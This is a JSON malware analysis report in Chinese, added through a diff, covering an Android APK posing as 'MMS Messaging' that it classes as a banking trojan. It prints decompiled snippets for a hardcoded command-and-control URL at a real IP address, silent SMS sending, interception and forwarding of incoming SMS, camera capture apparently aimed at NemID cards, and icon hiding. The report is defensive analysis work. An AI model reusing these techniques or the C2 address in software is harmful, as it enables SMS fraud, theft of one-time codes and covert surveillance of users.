@@ -1,0 +1,165 @@
+{
+  "APK信息": {
+    "文件名": "0432a460b1af4a31c0b0ab12106886ff9e5fd1b7a109c1a9e5ab29b4fafd6719.apk",
+    "sha256": "0432a460b1af4a31c0b0ab12106886ff9e5fd1b7a109c1a9e5ab29b4fafd6719",
+    "包名": "exts.denmark",
+    "应用名": "MMS Messaging",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 205.1
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\Constants;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static final String ADMIN_LINK = \"http://193.105.240.158/?action=command\";",
+          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class Constants {\n>>>     public static final String ADMIN_LINK = \"http://193.105.240.158/?action=command\";\n      public static final String APP_ID = \"APP_ID\";\n      public static final String CARD_SENT = \"CARD_SENT\";\n      public static final String INSTALL_ID = \"1\";",
+          "behavior_description": "代码硬编码了一个包含IP地址和?action=command参数的C2服务器URL，用于接收远程控制指令。结合同类的其他常量（如INTERCEPTING_ENABLED、LOCK_ENABLED等），该地址很可能被用于下发拦截短信、锁定设备等恶意指令。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\utils\\Utils;",
+          "method_signature": "for(int i = 0; i < parts.size()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "sms.sendMultipartTextMessage(number, null, parts, sents, null);\nsms.sendTextMessage(number, null, text, PendingIntent.getBroadcast(context, 0, sentIntent2, 134217728), null);",
+          "malicious_code_snippet_context": "                      sentIntent.putExtra(\"text\", parts.get(i));\n                      sents.add(PendingIntent.getBroadcast(context, 0, sentIntent, 134217728));\n                  }\n>>>                 sms.sendMultipartTextMessage(number, null, parts, sents, null);\n>>>                 return;\n              }\n              Intent sentIntent2 = new Intent(Starter.ACTION_REPORT);\n              sentIntent2.putExtra(\"number\", number);",
+          "behavior_description": "该代码通过 SmsManager 静默发送短信，无需用户交互。方法接收 number 和 text 参数作为数据来源，分别调用 sendMultipartTextMessage() 发送长短信（分片）和 sendTextMessage() 发送普通短信，目标号码和短信内容均由程序内部逻辑控制，用户无感知。在已确认的恶意样本中，此行为通常用于向付费号码发送短信或进行短信欺诈，直接造成用户经济损失。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lexts\\denmark\\MessageReceiver;",
+          "method_signature": "if(needToInterceptIncoming)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Map<String, String> messages = retrieveMessages(intent);\nfor (String sender : messages.keySet()) {\n    String text = messages.get(sender);\n    boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\n    Intent start = new Intent(context, SendService.class);\n    start.setAction(SendService.REPORT_INCOMING_MESSAGE);\n    start.putExtra(\"number\", sender);\n    start.putExtra(\"text\", text);\n    context.startService(start);\n    if (needToInterceptIncoming) {\n        abortBroadcast();\n    }\n}",
+          "malicious_code_snippet_context": "      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n          SharedPreferences settings = context.getSharedPreferences(Constants.PREFS_NAME, 0);\n>>>         Map<String, String> messages = retrieveMessages(intent);\n>>>         for (String sender : messages.keySet()) {\n>>>             String text = messages.get(sender);\n>>>             boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\n>>>             Intent start = new Intent(context, (Class<?>) SendService.class);\n>>>             start.setAction(SendService.REPORT_INCOMING_MESSAGE);\n>>>             start.putExtra(\"number\", sender);\n>>>             start.putExtra(\"text\", text);\n>>>             context.startService(start);\n>>>             if (needToInterceptIncoming) {\n>>>                 abortBroadcast();\n>>>             }\n>>>         }\n      }\n  \n      private static Map<String, String> retrieveMessages(Intent intent) {",
+          "behavior_description": "该代码在BroadcastReceiver中接收系统短信广播，通过retrieveMessages从Intent的pdus中提取短信发送方号码和内容，随后将短信内容转发给SendService（可能上报C2或转发），并在拦截开关开启时调用abortBroadcast()终止广播，使系统短信应用无法收到该短信，实现短信隐藏/拦截，典型银行木马行为用于窃取验证码。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "android.media.action.IMAGE_CAPTURE"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\activities\\NemidTaker;",
+          "method_signature": "dispatchTakePictureIntent()",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent takePictureIntent = new Intent(\"android.media.action.IMAGE_CAPTURE\");\nif (takePictureIntent.resolveActivity(getPackageManager()) != null) {\n    File photoFile = createImageFile();\n    takePictureIntent.putExtra(\"output\", Uri.fromFile(photoFile));\n    startActivityForResult(takePictureIntent, 1);\n}",
+          "malicious_code_snippet_context": "  \n      /* JADX INFO: Access modifiers changed from: private */\n      public void dispatchTakePictureIntent() {\n>>>         Intent takePictureIntent = new Intent(\"android.media.action.IMAGE_CAPTURE\");\n>>>         if (takePictureIntent.resolveActivity(getPackageManager()) != null) {\n>>>             try {\n>>>                 File photoFile = createImageFile();\n>>>                 takePictureIntent.putExtra(\"output\", Uri.fromFile(photoFile));\n>>>                 startActivityForResult(takePictureIntent, 1);\n              } catch (IOException ex) {\n                  ex.printStackTrace();\n              }",
+          "behavior_description": "代码通过 Intent (android.media.action.IMAGE_CAPTURE) 调起系统摄像头应用进行拍照，并将拍摄的照片保存到外部存储的临时文件中。结合其类名 NemidTaker 及恶意样本背景，此行为极有可能是银行木马用于诱导用户拍摄身份证件或 NemID 密钥卡，从而窃取用户的敏感凭证和身份信息。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\Main;",
+          "method_signature": "hide()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "ComponentName componentName = new ComponentName(this, Main.class);\npackageManager.setComponentEnabledSetting(componentName, 2, 1);",
+          "malicious_code_snippet_context": "  \n      private void hide() {\n          PackageManager packageManager = getPackageManager();\n>>>         ComponentName componentName = new ComponentName(this, (Class<?>) Main.class);\n>>>         packageManager.setComponentEnabledSetting(componentName, 2, 1);\n      }\n  }",
+          "behavior_description": "代码通过 PackageManager.setComponentEnabledSetting() 将主 Activity 组件设置为禁用状态（参数2=COMPONENT_ENABLED_STATE_DISABLED），使应用图标从启动器中消失。恶意软件通常在用户首次启动后调用此方法隐藏图标，同时后台 MainService 继续运行，使用户难以发现和卸载恶意应用。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
